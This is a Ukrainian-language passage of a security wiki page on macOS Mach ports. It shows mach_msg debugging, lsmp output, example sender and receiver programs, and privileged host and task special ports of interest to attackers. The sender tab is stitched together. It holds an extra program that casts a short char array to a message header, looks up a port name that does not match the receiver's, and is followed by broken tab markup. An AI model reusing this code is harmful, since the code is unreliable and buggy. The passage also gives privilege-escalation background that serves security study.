–û—Å–∫—ñ–ª—å–∫–∏ —Ñ—É–Ω–∫—Ü—ñ—ó **`mach_msg`** —Ç–∞ **`mach_msg_overwrite`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–æ—á–∫–∏ –∑—É–ø–∏–Ω–∫–∏ –Ω–∞ –Ω–∏—Ö –¥–æ–∑–≤–æ–ª–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–æ—á–Ω—ñ—Ç—å –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –±—É–¥—å-—è–∫–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—É –º–æ–∂–Ω–∞ –Ω–∞–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å **`libSystem.B`, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é**.
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
–û—Ç—Ä–∏–º–∞–π—Ç–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑ —Ä–µ—î—Å—Ç—Ä—ñ–≤:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏ –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
–¢–∞–∫–∏–π —Ç–∏–ø `mach_msg_bits_t` –¥—É–∂–µ –ø–æ—à–∏—Ä–µ–Ω–∏–π –¥–ª—è –¥–æ–∑–≤–æ–ª—É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.



### –ü–µ—Ä–µ–ª—ñ–∫ –ø–æ—Ä—Ç—ñ–≤
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**–Ü–º'—è** - —Ü–µ —Ç–∏–ø–æ–≤–µ —ñ–º'—è, —è–∫–µ –Ω–∞–¥–∞—î—Ç—å—Å—è –ø–æ—Ä—Ç—É (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ –≤–æ–Ω–æ **–∑–±—ñ–ª—å—à—É—î—Ç—å—Å—è** —É –ø–µ—Ä—à–∏—Ö 3 –±–∞–π—Ç–∞—Ö). **`ipc-object`** - —Ü–µ **–∑–∞—Ç–µ–º–Ω–µ–Ω–∏–π** —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä** –ø–æ—Ä—Ç—É.\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ —Ç–µ, —è–∫ –ø–æ—Ä—Ç–∏ –ª–∏—à–µ –∑ –ø—Ä–∞–≤–æ–º **`send`** —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å **–≤–ª–∞—Å–Ω–∏–∫–∞** (—ñ–º'—è –ø–æ—Ä—Ç—É + pid).\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`+`** –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è **—ñ–Ω—à–∏—Ö –∑–∞–≤–¥–∞–Ω—å, –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏—Ö –¥–æ —Ç–æ–≥–æ –∂ –ø–æ—Ä—Ç—É**.

–¢–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**procesxp**](https://www.newosxbook.com/tools/procexp.html), —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ —Ç–∞–∫–æ–∂ **–∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω—ñ –Ω–∞–∑–≤–∏ —Å–ª—É–∂–±** (–∑ –≤–∏–º–∫–Ω–µ–Ω–∏–º SIP —á–µ—Ä–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å `com.apple.system-task-port`).
```
procesp 1 ports
```
–í–∏ –º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ü–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –≤ iOS, –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –π–æ–≥–æ –∑ [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### –ü—Ä–∏–∫–ª–∞–¥ –∫–æ–¥—É

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ **–≤—ñ–¥–ø—Ä–∞–≤–Ω–∏–∫** –≤–∏–¥—ñ–ª—è—î –ø–æ—Ä—Ç, —Å—Ç–≤–æ—Ä—é—î **–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É** –¥–ª—è —ñ–º–µ–Ω—ñ `org.darlinghq.example` —Ç–∞ –Ω–∞–¥—Å–∏–ª–∞—î –π–æ–≥–æ –Ω–∞ **—Å–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**, —Ç–æ–¥—ñ —è–∫ –≤—ñ–¥–ø—Ä–∞–≤–Ω–∏–∫ –∑–∞–ø—Ä–æ—Å–∏–≤ **–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É** —Ü—å–æ–≥–æ —ñ–º–µ–Ω—ñ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ –π–æ–≥–æ –¥–ª—è **–Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 
### –í—ñ–¥–ø—Ä–∞–≤–Ω–∏–∫

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ –º—ñ–∂–ø—Ä–æ—Ü–µ—Å–æ–≤–∏–π –∫–∞–Ω–∞–ª (IPC) –Ω–∞ macOS. –í—ñ–Ω —Å—Ç–≤–æ—Ä—é—î —á–µ—Ä–≥—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —Ç–∞ –æ—á—ñ–∫—É—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å –≤—ñ–¥ –æ—Ç—Ä–∏–º—É–≤–∞—á–∞.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>

#define QUEUE_NAME "com.example.queue"

int main() {
    mach_port_t port;
    kern_return_t err;

    err = task_get_special_port(mach_task_self(), TASK_NAME_PORT, &port);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get task special port: %s\n", mach_error_string(err));
        exit(1);
    }

    mach_port_t queue;
    err = bootstrap_look_up(bootstrap_port, QUEUE_NAME, &queue);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Failed to look up queue port: %s\n", mach_error_string(err));
        exit(1);
    }

    char message[] = "Hello, receiver!";
    mach_msg_header_t *msg = (mach_msg_header_t *)message;
    msg->msgh_local_port = port;
    msg->msgh_remote_port = queue;
    msg->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
    msg->msgh_id = 0;
    msg->msgh_size = sizeof(message);

    err = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Failed to send message: %s\n", mach_error_string(err));
        exit(1);
    }

    printf("Message sent successfully!\n");

    return 0;
}
```

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –ø–æ—Ä—Ç–∏

–Ü—Å–Ω—É—é—Ç—å –¥–µ—è–∫—ñ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –ø–æ—Ä—Ç–∏, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –ø–µ–≤–Ω—ñ —á—É—Ç–ª–∏–≤—ñ –¥—ñ—ó –∞–±–æ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–µ–≤–Ω–∏—Ö —á—É—Ç–ª–∏–≤–∏—Ö –¥–∞–Ω–∏—Ö**, —è–∫—â–æ –∑–∞–≤–¥–∞–Ω–Ω—è –º–∞—é—Ç—å –¥–æ–∑–≤–æ–ª–∏ **SEND** –Ω–∞ –Ω–∏—Ö. –¶–µ —Ä–æ–±–∏—Ç—å —Ü—ñ –ø–æ—Ä—Ç–∏ –¥—É–∂–µ —Ü—ñ–∫–∞–≤–∏–º–∏ –∑ —Ç–æ—á–∫–∏ –∑–æ—Ä—É –∞—Ç–∞–∫–∏ –Ω–µ –ª–∏—à–µ —á–µ—Ä–µ–∑ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ, –∞–ª–µ –π —á–µ—Ä–µ–∑ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–ø–æ–¥—ñ–ª—É –¥–æ–∑–≤–æ–ª—ñ–≤ SEND –º—ñ–∂ –∑–∞–≤–¥–∞–Ω–Ω—è–º–∏**.

### –°–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –ø–æ—Ä—Ç–∏ —Ö–æ—Å—Ç–∞

–¶—ñ –ø–æ—Ä—Ç–∏ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ñ —á–∏—Å–ª–∞–º–∏.

–ü—Ä–∞–≤–∞ **SEND** –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ **`host_get_special_port`**, –∞ –ø—Ä–∞–≤–∞ **RECEIVE** - –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ **`host_set_special_port`**. –û–¥–Ω–∞–∫ –æ–±–∏–¥–≤–∞ –≤–∏–∫–ª–∏–∫–∏ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å –ø–æ—Ä—Ç—É **`host_priv`**, –¥–æ —è–∫–æ–≥–æ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ root. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —É –º–∏–Ω—É–ª–æ–º—É root –º—ñ–≥ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **`host_set_special_port`** —Ç–∞ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π, —â–æ –¥–æ–∑–≤–æ–ª—è–ª–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ–±—Ö—ñ–¥ –ø—ñ–¥–ø–∏—Å—ñ–≤ –∫–æ–¥—É, –∑–∞—Ö–æ–ø–ª—é—é—á–∏ `HOST_KEXTD_PORT` (SIP –∑–∞—Ä–∞–∑ –∑–∞–ø–æ–±—ñ–≥–∞—î —Ü—å–æ–º—É).

–¶—ñ –ø–æ—Ä—Ç–∏ –ø–æ–¥—ñ–ª–µ–Ω—ñ –Ω–∞ 2 –≥—Ä—É–ø–∏: **–ø–µ—Ä—à—ñ 7 –ø–æ—Ä—Ç—ñ–≤ –Ω–∞–ª–µ–∂–∞—Ç—å —è–¥—Ä—É**, –¥–µ 1 - `HOST_PORT`, 2 - `HOST_PRIV_PORT`, 3 - `HOST_IO_MASTER_PORT`, –∞ 7 - `HOST_MAX_SPECIAL_KERNEL_PORT`.\
–¢—ñ, —â–æ –ø–æ—á–∏–Ω–∞—é—Ç—å **–∑ –Ω–æ–º–µ—Ä–∞ 8**, **–Ω–∞–ª–µ–∂–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω–∏–º —Å–ª—É–∂–±–∞–º** —ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–Ω–∞–π–¥–µ–Ω—ñ –≤ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—ñ [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **–ü–æ—Ä—Ç —Ö–æ—Å—Ç–∞**: –Ø–∫—â–æ –ø—Ä–æ—Ü–µ—Å –º–∞—î **–ø—Ä–∏–≤—ñ–ª–µ–π SEND** –Ω–∞ —Ü–µ–π –ø–æ—Ä—Ç, –≤—ñ–Ω –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –ø—Ä–æ **—Å–∏—Å—Ç–µ–º—É**, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ –π–æ–≥–æ —Ä—É—Ç–∏–Ω–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
* `host_processor_info`: –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –ø—Ä–æ—Ü–µ—Å–æ—Ä
* `host_info`: –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ö–æ—Å—Ç
* `host_virtual_physical_table_info`: –í—ñ—Ä—Ç—É–∞–ª—å–Ω–∞/—Ñ—ñ–∑–∏—á–Ω–∞ —Ç–∞–±–ª–∏—Ü—è —Å—Ç–æ—Ä—ñ–Ω–æ–∫ (–ø–æ—Ç—Ä—ñ–±–µ–Ω MACH\_VMDEBUG)
* `host_statistics`: –û—Ç—Ä–∏–º–∞—Ç–∏ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É —Ö–æ—Å—Ç–∞
* `mach_memory_info`: –û—Ç—Ä–∏–º–∞—Ç–∏ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –ø–∞–º'—è—Ç—ñ —è–¥—Ä–∞
* **–ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –ø–æ—Ä—Ç —Ö–æ—Å—Ç–∞**: –ü—Ä–æ—Ü–µ—Å –∑ –ø—Ä–∞–≤–æ–º **SEND** –Ω–∞ —Ü–µ–π –ø–æ—Ä—Ç –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–æ–∫–∞–∑—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∞–±–æ —Å–ø—Ä–æ–±—É –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —è–¥—Ä–∞. **–ü—Ä–æ—Ü–µ—Å –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ root**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü–µ–π –¥–æ–∑–≤—ñ–ª.
* –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –¥–ª—è –≤–∏–∫–ª–∏–∫—É API **`kext_request`** –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ —ñ–Ω—à—ñ –¥–æ–∑–≤–æ–ª–∏ **`com.apple.private.kext*`**, —è–∫—ñ –Ω–∞–¥–∞—é—Ç—å—Å—è –ª–∏—à–µ –±—ñ–Ω–∞—Ä–Ω–∏–º —Ñ–∞–π–ª–∞–º Apple.
* –Ü–Ω—à—ñ —Ä—É—Ç–∏–Ω–∞, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏:
* `host_get_boot_info`: –û—Ç—Ä–∏–º–∞—Ç–∏ `machine_boot_info()`
* `host_priv_statistics`: –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—É —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
* `vm_allocate_cpm`: –í–∏–¥—ñ–ª–∏—Ç–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—É —Ñ—ñ–∑–∏—á–Ω—É –ø–∞–º'—è—Ç—å
* `host_processors`: –ü–æ—Å–ª–∞—Ç–∏ –ø—Ä–∞–≤–æ –Ω–∞ –ø—Ä–æ—Ü–µ—Å–æ—Ä–∏ —Ö–æ—Å—Ç–∞
* `mach_vm_wire`: –ó—Ä–æ–±–∏—Ç–∏ –ø–∞–º'—è—Ç—å –ø–æ—Å—Ç—ñ–π–Ω–æ—é
* –û—Å–∫—ñ–ª—å–∫–∏ **root** –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ü—å–æ–≥–æ –¥–æ–∑–≤–æ–ª—É, –≤—ñ–Ω –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `host_set_[special/exception]_port[s]`, —â–æ–± **–∑–∞—Ö–æ–ø–∏—Ç–∏ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –∞–±–æ –≤–∏–Ω—è—Ç–∫–æ–≤—ñ –ø–æ—Ä—Ç–∏ —Ö–æ—Å—Ç–∞**.

–ú–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –≤—Å—ñ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –ø–æ—Ä—Ç–∏ —Ö–æ—Å—Ç–∞**, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏:
```bash
procexp all ports | grep "HSP"
```
### –°–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –ø–æ—Ä—Ç–∏ –∑–∞–≤–¥–∞–Ω—å

–¶–µ –ø–æ—Ä—Ç–∏, –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω—ñ –¥–ª—è –≤—ñ–¥–æ–º–∏—Ö —Å–ª—É–∂–±. –á—Ö –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏/–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ `task_[get/set]_special_port`. –á—Ö –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
–ó [—Ç—É—Ç](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É task-self\]: –ü–æ—Ä—Ç, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ü–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å, —è–∫—ñ –≤–ø–ª–∏–≤–∞—é—Ç—å –Ω–∞ –∑–∞–≤–¥–∞–Ω–Ω—è. –¶–µ –ø–æ—Ä—Ç, —è–∫–∏–π –ø–æ–≤–µ—Ä—Ç–∞—î **mach\_task\_self (–¥–∏–≤. –ø–æ—Ä—Ç–∏ –∑–∞–≤–¥–∞–Ω—å –Ω–∏–∂—á–µ)**.
* **TASK\_BOOTSTRAP\_PORT**\[–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É bootstrap\]: –ó–∞–ø—É—Å–∫–æ–≤–∏–π –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —ñ–∑ –∑–∞–ø–∏—Ç–æ–º –Ω–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö –ø–æ—Ä—Ç—ñ–≤ —Å–ª—É–∂–± —Å–∏—Å—Ç–µ–º–∏.
* **TASK\_HOST\_NAME\_PORT**\[–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É host-self\]: –ü–æ—Ä—Ç, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–ø–∏—Ç—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤–º—ñ—Å—Ç —Ö–æ—Å—Ç–∞. –¶–µ –ø–æ—Ä—Ç, —è–∫–∏–π –ø–æ–≤–µ—Ä—Ç–∞—î **mach\_host\_self**.
